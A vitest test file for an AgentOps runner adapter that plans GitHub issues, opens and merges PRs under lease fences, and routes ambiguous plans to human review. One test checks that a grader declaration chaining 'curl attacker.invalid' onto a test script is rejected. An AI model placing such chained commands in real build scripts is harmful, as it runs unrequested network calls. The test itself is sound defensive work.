import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { GithubIssueSnapshot } from '../src/domain/schema.js';
import { Store } from '../src/store/store.js';
import { findingsPath } from '../src/pipeline/execution/perspective-session.js';
import type { PostgresControlStore } from '../src/control-store/store.js';
import type {
  ExecutionGuardVerdict,
  Lease,
  RunnerCriticalBoundary,
  RunnerJobPayloadV1,
} from '../src/control-store/types.js';
import {
  ExistingAgentOpsRunnerAdapter,
  inferRepositoryGraders,
} from '../src/runner/adapter.js';
import { RunnerLeaseFence } from '../src/runner/guard.js';

const roots: string[] = [];
afterEach(() => {
  delete process.env.AGENTOPS_RUNNER_REGISTRATION_ROOT;
  while (roots.length > 0) {
    fs.rmSync(roots.pop()!, { recursive: true, force: true });
  }
});

const registrationId = 'ca3126a8-b83f-4698-90af-462523880c20';
const jobId = 'db837db2-30d7-4788-a56f-00056f5d550e';

function payload(): RunnerJobPayloadV1 {
  return {
    schemaVersion: 1,
    repository: { owner: 'owner', name: 'repo' },
    event: { kind: 'issue', number: 14, action: 'labeled' },
    target: { baseRef: 'refs/heads/main' },
    execution: {
      mode: 'development_turn',
      requiredChecks: [],
      mergeMethod: 'squash',
      readyLabel: 'human-approved',
      claimedLabel: 'automation-owned',
    },
    artifacts: [],
  };
}

function lease(): Lease {
  return {
    id: 'ad837db2-30d7-4788-a56f-00056f5d550e',
    token: 'bd837db2-30d7-4788-a56f-00056f5d550e',
    workerId: 'runner-adapter',
    attemptId: 'cd837db2-30d7-4788-a56f-00056f5d550e',
    attemptNumber: 1,
    expiresAt: '2026-07-25T00:10:00.000Z',
    job: {
      contractVersion: 1,
      id: jobId,
      registrationId,
      registrationVersion: 1,
      source: { kind: 'manual', key: 'adapter-safe-path' },
      idempotencyKey: 'adapter-safe-path',
      jobType: 'agentops.runner',
      payload: payload(),
      status: 'leased',
      createdAt: '2026-07-25T00:00:00.000Z',
    },
  };
}

describe('existing AgentOps isolated-runner adapter', () => {
  it('selects grader profiles from bounded repository metadata, not repository names', () => {
    for (const directory of ['acme-widgets', 'design-system-contracts']) {
      const root = fs.mkdtempSync(path.join(os.tmpdir(), `${directory}-`));
      roots.push(root);
      fs.mkdirSync(path.join(root, 'scripts'), { recursive: true });
      fs.writeFileSync(
        path.join(root, 'scripts', 'check-contracts.mjs'),
        'process.exitCode = 0;\n',
      );
      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
        name: directory,
        scripts: { test: 'node scripts/check-contracts.mjs' },
      }));
      expect(inferRepositoryGraders(root)).toEqual({
        typecheck: 'node scripts/check-contracts.mjs',
        commands: {
          build: 'node scripts/check-contracts.mjs',
          typecheck: 'node scripts/check-contracts.mjs',
          api_test: 'node scripts/check-contracts.mjs',
          db_state_check: 'node scripts/check-contracts.mjs',
        },
      });
    }
  });

  it('rejects shell-bearing or missing repository grader declarations', () => {
    for (const testScript of [
      'node scripts/check.mjs && curl attacker.invalid',
      'npm test',
      '../outside',
    ]) {
      const root = fs.mkdtempSync(path.join(os.tmpdir(), 'unsafe-grader-'));
      roots.push(root);
      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
        scripts: { test: testScript },
      }));
      expect(() => inferRepositoryGraders(root)).toThrow(
        /supported bounded grader profile/,
      );
    }
  });

  it('surfaces planning ambiguity as one non-PR human-review outcome and releases the claim', async () => {
    const root = fs.mkdtempSync(path.join(
      os.tmpdir(),
      'agentops-runner-human-review-',
    ));
    roots.push(root);
    const registrationRoot = path.join(root, 'registrations', registrationId);
    const worktreePath = path.join(
      registrationRoot,
      'jobs',
      jobId,
      'attempt-1',
      'worktree',
    );
    const statePath = path.join(registrationRoot, 'jobs', jobId, 'state');
    const artifactPath = path.join(
      registrationRoot,
      'jobs',
      jobId,
      'attempt-1',
      'artifacts',
    );
    fs.mkdirSync(worktreePath, { recursive: true });
    fs.mkdirSync(artifactPath, { recursive: true });
    fs.writeFileSync(path.join(worktreePath, 'package.json'), JSON.stringify({
      devDependencies: {
        typescript: '^5.6.2',
        vitest: '^3.2.7',
      },
    }));

    const boundaries: RunnerCriticalBoundary[] = [];
    const guardStore = {
      async assertExecutionGuard(
        input: { boundary: RunnerCriticalBoundary },
      ) {
        boundaries.push(input.boundary);
        return {
          ok: true,
          reason: null,
          registration: null,
          jobId,
          leaseExpiresAt: '2026-07-25T00:10:00.000Z',
        };
      },
    } as unknown as PostgresControlStore;
    const issue = GithubIssueSnapshot.parse({
      repository: 'owner/repo',
      number: 14,
      externalId: 'I_14',
      title: 'Choose policy boundaries',
      body: 'Users need a human decision before implementation.',
      url: 'https://github.com/owner/repo/issues/14',
      labels: ['human-approved'],
      state: 'open',
      sourceUpdatedAt: '2026-07-25T00:00:00.000Z',
      snapshotAt: '2026-07-25T00:00:01.000Z',
    });
    const ambiguities = [
      'Specify conflict behavior',
      'Choose the retention window',
      'Confirm actor permissions',
      'Define the compatibility floor',
      'Decide audit visibility',
    ];
    const sideEffects: string[] = [];
    let managedBody = '';
    const adapter = new ExistingAgentOpsRunnerAdapter({
      issueRunner: () => ({
        listReadyIssues: () => [issue],
        claimIssue: () => {
          sideEffects.push('claim');
        },
      }),
      planningHumanReviewGithub: () => ({
        ensureManagedComment(repository, issueNumber, comment) {
          sideEffects.push(`comment:${repository}#${issueNumber}`);
          managedBody = comment.body;
          return 'https://github.com/owner/repo/issues/14#issuecomment-1';
        },
        removeClaimedLabel(repository, issueNumber, claimedLabel) {
          sideEffects.push(
            `remove:${repository}#${issueNumber}:${claimedLabel}`,
          );
        },
      }),
      planningRunner: async () => ({
        provider: 'codex',
        model: null,
        prompt: 'ambiguous planning fixture',
        outcome: 'completed',
        output: {
          candidates: [{
            candidateKey: 'policy-boundaries',
            title: 'Implement policy boundaries',
            type: 'feature',
            area: 'backend',
            contract: {
              productGoal: 'Apply the selected policy',
              userStory: 'As a user I get deterministic policy behavior',
              scope: { include: ['src/**'], exclude: [] },
              acceptanceCriteria: [{
                id: 'AC-POLICY-001',
                severity: 'blocker',
                behavior: 'The selected policy is applied',
                verification: {
                  method: 'unit_test',
                  expected: ['selected policy is applied'],
                },
              }],
              redLines: [],
            },
            traces: [{
              criterionId: 'AC-POLICY-001',
              sources: [{ kind: 'source', text: 'human decision' }],
            }],
          }],
          ambiguities,
        },
      }),
      generatorSession: async () => {
        throw new Error('generator must not run after planning ambiguity');
      },
    });
    const activeLease = lease();
    const result = await adapter.execute({
      lease: activeLease,
      payload: payload(),
      workspace: {
        registrationRoot,
        repositoryPath: path.join(registrationRoot, 'repository.git'),
        worktreePath,
        statePath,
        artifactPath,
        headSha: 'a'.repeat(40),
      },
      fence: new RunnerLeaseFence(
        guardStore,
        activeLease,
        activeLease.workerId,
        60_000,
      ),
      provider: 'codex',
      log: () => {},
    });

    expect(result).toMatchObject({
      outcome: 'needs-human-review',
      headSha: null,
      pullRequestNumber: null,
      humanReview: {
        issueNumber: 14,
        reasons: ambiguities.map((ambiguity) =>
          `planning ambiguity: ${ambiguity}`),
      },
    });
    expect(sideEffects).toEqual([
      'claim',
      'comment:owner/repo#14',
      'remove:owner/repo#14:automation-owned',
    ]);
    for (const ambiguity of ambiguities) {
      expect(managedBody).toContain(`planning ambiguity: ${ambiguity}`);
    }
    expect(managedBody).toContain(
      'AgentOps はこの停止では `human-approved` を付けません。',
    );
    expect(boundaries.filter((boundary) => boundary === 'release'))
      .toHaveLength(2);
    const persisted = new Store(statePath);
    expect(persisted.db.intakeRecords[0]?.status)
      .toBe('needs-human-review');
    expect(persisted.db.planningEnrichments[0]?.status)
      .toBe('needs-human-review');
    expect(persisted.db.prs).toHaveLength(0);
  });

  it('drives planning, PR-native review, checks, expected-SHA merge, and release through every fence', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'agentops-runner-adapter-'));
    roots.push(root);
    const registrationRoot = path.join(root, 'registrations', registrationId);
    const worktreePath = path.join(
      registrationRoot,
      'jobs',
      jobId,
      'attempt-1',
      'worktree',
    );
    const statePath = path.join(registrationRoot, 'jobs', jobId, 'state');
    const artifactPath = path.join(
      registrationRoot,
      'jobs',
      jobId,
      'attempt-1',
      'artifacts',
    );
    fs.mkdirSync(worktreePath, { recursive: true });
    fs.mkdirSync(artifactPath, { recursive: true });
    fs.writeFileSync(path.join(worktreePath, 'package.json'), JSON.stringify({
      devDependencies: {
        typescript: '^5.6.2',
        vitest: '^3.2.7',
      },
    }));

    const boundaries: RunnerCriticalBoundary[] = [];
    const verdict: ExecutionGuardVerdict = {
      ok: true,
      reason: null,
      registration: null,
      jobId,
      leaseExpiresAt: '2026-07-25T00:10:00.000Z',
    };
    const guardStore = {
      async assertExecutionGuard(input: { boundary: RunnerCriticalBoundary }) {
        boundaries.push(input.boundary);
        return verdict;
      },
    } as unknown as PostgresControlStore;
    const githubSideEffects: string[] = [];
    let githubMerged = false;
    const headSha = 'a'.repeat(40);
    const issue = GithubIssueSnapshot.parse({
      repository: 'owner/repo',
      number: 14,
      externalId: 'I_14',
      title: 'Add safe path',
      body: 'Users need the safe path.',
      url: 'https://github.com/owner/repo/issues/14',
      labels: ['human-approved'],
      state: 'open',
      sourceUpdatedAt: '2026-07-25T00:00:00.000Z',
      snapshotAt: '2026-07-25T00:00:01.000Z',
    });
    const adapter = new ExistingAgentOpsRunnerAdapter({
      issueRunner: () => ({
        listReadyIssues: () => [issue],
        claimIssue: () => {
          githubSideEffects.push('claim');
        },
      }),
      planningRunner: async () => ({
        provider: 'codex',
        model: null,
        prompt: 'safe planning fixture',
        outcome: 'completed',
        output: {
          candidates: [{
            candidateKey: 'safe-path',
            title: 'Implement safe path',
            type: 'feature',
            area: 'backend',
            contract: {
              productGoal: 'Safe path',
              userStory: 'As a user I use the safe path',
              scope: { include: ['src/**'], exclude: [] },
              acceptanceCriteria: [{
                id: 'AC-SAFE-001',
                severity: 'blocker',
                behavior: 'The safe path works',
                verification: {
                  method: 'unit_test',
                  expected: ['safe path works'],
                },
              }],
              redLines: [],
            },
            traces: [{
              criterionId: 'AC-SAFE-001',
              sources: [{ kind: 'source', text: 'safe path' }],
            }],
          }],
          ambiguities: [],
        },
      }),
      generatorSession: async () => ({
        provider: 'codex',
        model: null,
        worktree: worktreePath,
        branch: 'agent/issue-0001-s0',
        session: 'safe-generator',
        outcome: 'completed',
        changed: ['src/safe.ts'],
        headSha,
        paneTail: '',
        prompt: 'safe generator fixture',
      }),
      groundBuild: () => ({
        branch: 'agent/issue-0001-s0',
        summary: 'safe grounded fixture',
        filesChanged: ['src/safe.ts'],
        satisfied: { 'AC-SAFE-001': true },
        buildPasses: true,
        typecheckPasses: true,
        unitTestsPass: true,
        apiTestsPass: true,
        hasTests: true,
        secretsLeaked: false,
        scopeViolations: [],
        quality: {
          codeQuality: 1,
          testQuality: 1,
          ux: 1,
          accessibility: 1,
        },
        notes: [],
      }),
      perspectiveSessions: async (_config, input) => {
        const evalRoot = path.join(input.worktree, '.agentops', 'eval');
        const reviewed = input.perspectives.filter((perspective) =>
          !perspective.deterministic);
        for (const perspective of reviewed) {
          const filename = findingsPath(evalRoot, perspective.key);
          fs.mkdirSync(path.dirname(filename), { recursive: true });
          fs.writeFileSync(filename, JSON.stringify({
            verdict: 'approve',
            score: 1,
            findings: [],
          }));
        }
        return {
          evalRoot,
          completed: reviewed.map((perspective) => perspective.key),
          touchedCode: [],
          environmentChanges: {},
          invocations: reviewed.map((perspective) => ({
            role: 'reviewer' as const,
            perspective: perspective.key,
            provider: 'codex' as const,
            model: null,
            prompt: `review ${perspective.key}`,
            outcome: 'completed' as const,
          })),
        };
      },
      gateRunner: () => ({
        pushBranch: () => {
          githubSideEffects.push('push');
        },
        createPr: () => {
          githubSideEffects.push('create-pr');
          return {
            provider: 'github',
            repository: 'owner/repo',
            number: 38,
            url: 'https://github.com/owner/repo/pull/38',
          };
        },
        viewPr: () => 'open',
      }),
      prNativeRunner: () => ({
        viewRevision: () => ({
          state: githubMerged ? 'merged' : 'open',
          headSha,
          isDraft: false,
          mergeability: 'mergeable',
          checks: [],
          unresolvedBlockingThreadIds: [],
          blockingReviewThreads: [],
        }),
        merge: (_cwd, number, expectedHeadSha) => {
          githubSideEffects.push(`merge:${number}:${expectedHeadSha}`);
          githubMerged = true;
        },
        closeIssue: (_cwd, _repository, number) => {
          githubSideEffects.push(`close-issue:${number}`);
        },
        listOpenPullRequests: () => [],
      }),
    });
    const activeLease = lease();
    const result = await adapter.execute({
      lease: activeLease,
      payload: payload(),
      workspace: {
        registrationRoot,
        repositoryPath: path.join(registrationRoot, 'repository.git'),
        worktreePath,
        statePath,
        artifactPath,
        headSha,
      },
      fence: new RunnerLeaseFence(
        guardStore,
        activeLease,
        activeLease.workerId,
        60_000,
      ),
      provider: 'codex',
      log: () => {},
    });

    expect(result).toMatchObject({
      headSha,
      pullRequestNumber: 38,
    });
    expect(githubSideEffects).toContain('push');
    expect(githubSideEffects).toContain('create-pr');
    expect(githubSideEffects).toContain(`merge:38:${headSha}`);
    for (const boundary of ['claim', 'provider', 'push', 'merge', 'release'] as const) {
      expect(boundaries).toContain(boundary);
    }
    expect(boundaries.filter((boundary) => boundary === 'push')).toHaveLength(2);
  });
});
